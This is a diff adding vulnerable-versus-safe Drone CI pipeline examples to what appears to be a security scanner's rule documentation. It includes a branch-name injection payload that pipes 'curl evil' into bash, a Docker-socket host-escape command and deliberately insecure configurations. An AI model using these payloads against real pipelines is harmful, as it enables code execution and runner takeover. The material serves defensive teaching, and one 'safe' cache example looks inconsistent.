@@ -4655,6 +4655,34 @@ If your image needs an APM-style preload (Datadog, Sentry, OpenTelemetry), scope
 
 - Local-build images (``image: my-org/build-tools:dev`` produced upstream in the same pipeline) sometimes can't be digest-pinned because the digest depends on the build. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the floating-tag risk still applies to every public-registry pull.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``golang:1.21`` is a mutable tag. Docker Hub
+# (or any compromise of the publisher's account) repoints
+# the tag at a new image on the next 1.21.x patch release
+# and the next pipeline run pulls the swap silently.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: test
+    image: golang:1.21
+    commands:
+      - go test ./...
+
+# Safe: pin to the content-addressable digest. Renovate /
+# Dependabot bump the digest in reviewable PRs.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: test
+    image: golang@sha256:abc123...
+    commands:
+      - go test ./...
+```
+
 **Source:** [`DR-001`](../providers/drone.md#dr-001) in the [Drone CI provider](../providers/drone.md).
 
 ### `DR-002`: Step runs with privileged: true <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-002 }
@@ -4664,6 +4692,37 @@ If your image needs an APM-style preload (Datadog, Sentry, OpenTelemetry), scope
 **How this is detected.** Drone's ``privileged: true`` is a step-scoped switch that maps directly to ``docker run --privileged``. The rule fires on either steps or services declaring the flag. The agent admin can also globally allow / deny privileged steps via the trusted-flag on the repository, the rule doesn't try to reach into Drone's server config and assumes the worst (a malicious or accidentally-trusted repo) so a ``privileged: true`` in source is always a finding.
 
 **Recommendation.** Drop ``privileged: true`` from the step. The flag removes the container's syscall and capability boundary, giving the step kernel-level access to the agent host. Most workloads that reach for it are Docker-in-Docker pipelines that can use a rootless alternative (``buildx``, ``kaniko``, ``buildah --isolation=chroot``) instead. If the workload genuinely needs syscalls, scope down with explicit ``cap_add: [SYS_ADMIN]`` and an isolated runner pool, rather than blanket privileged.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``privileged: true`` grants the step
+# container access to the host kernel's namespaces and
+# /dev. A workload compromise (poisoned image, build-
+# script RCE) escapes to the runner host and from there
+# to every other build sharing the runner.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: dind-build
+    image: docker:24
+    privileged: true
+    commands:
+      - docker build -t app .
+
+# Safe: use a rootless image builder (Kaniko, BuildKit
+# rootless) that produces images without privileged host
+# access. Drop ``privileged`` entirely.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: kaniko-build
+    image: gcr.io/kaniko-project/executor@sha256:abc123...
+    commands:
+      - /kaniko/executor --context=. --destination=registry/app:tag
+```
 
 **Source:** [`DR-002`](../providers/drone.md#dr-002) in the [Drone CI provider](../providers/drone.md).
 
@@ -4687,6 +4746,42 @@ The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRO
 
 - Trusted-only Drone variables (``DRONE_BUILD_NUMBER``, ``DRONE_BUILD_STATUS``, ``DRONE_REPO_NAMESPACE`` for non-fork repos) aren't user-controllable and are safe to interpolate unquoted. Drone-template syntax can also appear in YAML strings outside ``commands:``; this rule only scopes itself to step command bodies, so an unquoted use in (say) ``settings.message:`` doesn't fire here, those land under DR-004 / SBOM-style audits.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a branch named ``feat;curl evil|bash;`` lands
+# verbatim in the shell command via the
+# ``${DRONE_BRANCH}`` template variable. The injected
+# ``curl`` runs in the step's shell context with the
+# step's full secret set in scope.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: build
+    image: alpine@sha256:abc123...
+    commands:
+      - echo "Building ${DRONE_BRANCH}"
+      - ./build.sh --branch ${DRONE_BRANCH}
+
+# Safe: assign the untrusted value to a local shell
+# variable, quote on every use, and pass as an argument
+# to a script you own. Drone's template substitution
+# happens BEFORE the shell sees the command, so the
+# defense has to be at the shell layer.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: build
+    image: alpine@sha256:abc123...
+    environment:
+      BRANCH: ${DRONE_BRANCH}
+    commands:
+      - echo "Building $BRANCH"
+      - ./build.sh --branch "$BRANCH"
+```
+
 **Source:** [`DR-003`](../providers/drone.md#dr-003) in the [Drone CI provider](../providers/drone.md).
 
 ### `DR-004`: Literal credential in step environment / settings <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-dr-004 }
@@ -4700,6 +4795,44 @@ The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRO
 **Known false positives.**
 
 - Configuration values that happen to use a credential-shaped key name but never carry a secret (``DOCKER_CONFIG=/dev/null`` to suppress credential loading) sometimes trip this rule. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the broader credential-vocab match still catches real leaks elsewhere in the pipeline.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the AWS access key literal is committed to
+# the pipeline file. Any repo reader sees it; Drone's
+# build logs print it whenever the step echoes its
+# environment.
+kind: pipeline
+type: docker
+name: deploy
+steps:
+  - name: upload
+    image: aws-cli@sha256:abc123...
+    environment:
+      AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+      AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+    commands:
+      - aws s3 cp build/ s3://bucket/
+
+# Safe: reference Drone secrets via ``from_secret``. The
+# actual values live in Drone's secret store (per-repo or
+# org-level), are masked in logs, and can rotate without
+# a pipeline-file change.
+kind: pipeline
+type: docker
+name: deploy
+steps:
+  - name: upload
+    image: aws-cli@sha256:abc123...
+    environment:
+      AWS_ACCESS_KEY_ID:
+        from_secret: aws_access_key_id
+      AWS_SECRET_ACCESS_KEY:
+        from_secret: aws_secret_access_key
+    commands:
+      - aws s3 cp build/ s3://bucket/
+```
 
 **Source:** [`DR-004`](../providers/drone.md#dr-004) in the [Drone CI provider](../providers/drone.md).
 
@@ -4715,6 +4848,38 @@ The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRO
 
 - Internal-registry plugins built and pushed by the same pipeline (``image: my-org/internal-plugin:dev`` produced upstream) sometimes can't be exact-pinned. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``plugins/docker:latest`` resolves at runner
+# start to whatever Docker Hub currently serves under the
+# ``latest`` tag. Whoever controls the plugin repo (or
+# anyone with publisher access) ships code into every
+# pipeline that uses the plugin.
+kind: pipeline
+type: docker
+name: publish
+steps:
+  - name: push-image
+    image: plugins/docker:latest
+    settings:
+      repo: myorg/app
+      tags: latest
+
+# Safe: pin the plugin image to a content-addressable
+# digest. The plugin can't be repointed without changing
+# the pipeline file (and a reviewable PR with it).
+kind: pipeline
+type: docker
+name: publish
+steps:
+  - name: push-image
+    image: plugins/docker@sha256:abc123...
+    settings:
+      repo: myorg/app
+      tags: ${DRONE_TAG}
+```
+
 **Source:** [`DR-005`](../providers/drone.md#dr-005) in the [Drone CI provider](../providers/drone.md).
 
 ### `DR-006`: TLS verification disabled in step commands <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-006 }
@@ -4724,6 +4889,41 @@ The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRO
 **How this is detected.** Uses the cross-provider ``_primitives.tls_bypass`` detector shared with GHA-027, BK-008, JF-022, ADO-026, CC-024, GCB-011, and the CFN / Terraform rule packs. Covers curl / wget / git / npm / yarn / pip / helm / kubectl / ssh / docker / maven / gradle / aws bypasses. The rule scans every ``commands:`` entry on every step.
 
 **Recommendation.** Remove TLS-bypass flags from build commands. The most common offenders are ``curl --insecure`` / ``-k`` / ``wget --no-check-certificate``, ``pip config set global.trusted-host``, ``npm config set strict-ssl false``, and ``git -c http.sslverify=false``. Each exposes the build to TLS-MITM injection of a registry-served payload, which is a textbook supply-chain attack vector. If a registry's certificate is genuinely broken, fix the registry rather than permanently disabling verification, the bypass tends to outlive the broken cert and become a permanent weakness.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: every npm install in the build skips strict-
+# ssl validation. An attacker on the network path (corp
+# proxy, malicious mirror, BGP hijack) MITMs the registry
+# and ships malicious tarballs that npm installs without
+# any signal.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: install
+    image: node:20@sha256:abc123...
+    commands:
+      - npm config set strict-ssl false
+      - npm install
+
+# Safe: install the missing CA into the image (or use the
+# default trust store). Never disable TLS verification
+# pipeline-wide; if a registry's cert is broken, fix the
+# registry rather than papering over with a bypass that
+# outlives the broken cert.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: install
+    image: node:20@sha256:abc123...
+    commands:
+      - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
+      - update-ca-certificates
+      - npm install
+```
 
 **Source:** [`DR-006`](../providers/drone.md#dr-006) in the [Drone CI provider](../providers/drone.md).
 
@@ -4746,6 +4946,42 @@ The rule fires on the volume *declaration*, not on step-level mounts. A pipeline
 **Known false positives.**
 
 - Trusted-only pipelines on a dedicated runner fleet (no fork-PR access, no untrusted contributors) sometimes deliberately mount the Docker socket for image build / push workflows. Suppress via ignore-file when this is the deliberate posture and the runner pool's isolation is documented elsewhere; the rule has no way to know whether ``trusted: true`` is set on the repo from the pipeline YAML alone.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: mounting ``/var/run/docker.sock`` into the
+# step gives the step's container the Docker API as root
+# on the runner. ``docker run --privileged -v /:/host``
+# from inside the step then owns the runner.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: build
+    image: docker:24
+    volumes:
+      - name: dockersock
+        path: /var/run/docker.sock
+    commands:
+      - docker build -t app .
+volumes:
+  - name: dockersock
+    host:
+      path: /var/run/docker.sock
+
+# Safe: use a rootless image builder (Kaniko / BuildKit
+# rootless) that doesn't need the host runtime socket.
+# An empty temp volume is enough for the build cache.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: build
+    image: gcr.io/kaniko-project/executor@sha256:abc123...
+    commands:
+      - /kaniko/executor --context=. --destination=registry/app:tag
+```
 
 **Source:** [`DR-007`](../providers/drone.md#dr-007) in the [Drone CI provider](../providers/drone.md).
 
@@ -4774,6 +5010,54 @@ The rule fires on the volume *declaration*, not on step-level mounts. A pipeline
 **Known false positives.**
 
 - Plugins that namespace cache reads by branch on the *write* side and never read across branches (a deliberate cache partitioning) are technically safe, the attacker can poison their own branch's cache but can't reach the trusted-branch one. The rule has no way to verify partition boundaries at scan time; suppress via ignore-file scoped to the specific step name when the partitioning is audited.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``cache_key`` interpolates ``${DRONE_BRANCH}``.
+# A fork PR opens a branch named ``main`` (legal on the
+# fork side) and runs its build, populating the cache
+# under key ``main-build``. The next trusted-context
+# build of the *real* main branch reads the SAME cache
+# key — and pulls the fork PR's poisoned artifacts into
+# the production build.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: restore-cache
+    image: meltwater/drone-cache@sha256:abc123...
+    settings:
+      restore: true
+      cache_key: ${DRONE_BRANCH}-build
+      mount: [vendor/]
+  - name: build
+    image: golang@sha256:abc123...
+    commands: [go build ./...]
+
+# Safe: key on commit-stable inputs only — a SHA256 of
+# the lockfile (or ``go.sum`` / ``Cargo.lock`` / etc.)
+# is unique enough and is not attacker-controllable
+# across PR boundaries. ``${DRONE_COMMIT_SHA}`` is also
+# safe (cryptographic, fork-PR-distinct).
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: hash-deps
+    image: alpine@sha256:abc123...
+    commands:
+      - sha256sum go.sum | cut -d' ' -f1 > /tmp/dephash
+  - name: restore-cache
+    image: meltwater/drone-cache@sha256:abc123...
+    settings:
+      restore: true
+      cache_key: deps-${SHA}
+      mount: [vendor/]
+    environment:
+      SHA:
+        from_secret: deps_sha
+```
 
 **Source:** [`DR-009`](../providers/drone.md#dr-009) in the [Drone CI provider](../providers/drone.md).
 
@@ -4806,6 +5090,43 @@ Detection is value-only and case-sensitive against the documented variable names
 **Known false positives.**
 
 - Some teams use a static prefix plus a CI-controlled tail (``node: { pool: build-${DRONE_REPO_NAME} }``) to share a runner pool across repos. ``DRONE_REPO_NAME`` is set by the server, not the pusher, so it isn't on the tainted list, but if your team has its own conventions for trusted Drone vars, suppress on the specific pipeline name.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``node.queue: ${DRONE_BRANCH}`` lets a PR
+# author route their build to any runner pool by naming
+# their branch after it. A branch named ``production``
+# routes the PR build to the production-only runner with
+# elevated permissions, which were never meant to be
+# reachable from a PR.
+kind: pipeline
+type: docker
+name: build
+node:
+  queue: ${DRONE_BRANCH}
+steps:
+  - name: deploy
+    image: deploy-cli@sha256:abc123...
+    commands:
+      - ./deploy.sh
+
+# Safe: pin the runner label to a static literal that
+# matches your targeting policy. Production runners
+# should ALSO enforce the label server-side (Drone
+# agent's ``--labels`` flag) so the rule is one layer
+# of defense-in-depth.
+kind: pipeline
+type: docker
+name: build
+node:
+  queue: production
+steps:
+  - name: deploy
+    image: deploy-cli@sha256:abc123...
+    commands:
+      - ./deploy.sh
+```
 
 **Source:** [`DR-011`](../providers/drone.md#dr-011) in the [Drone CI provider](../providers/drone.md).
 
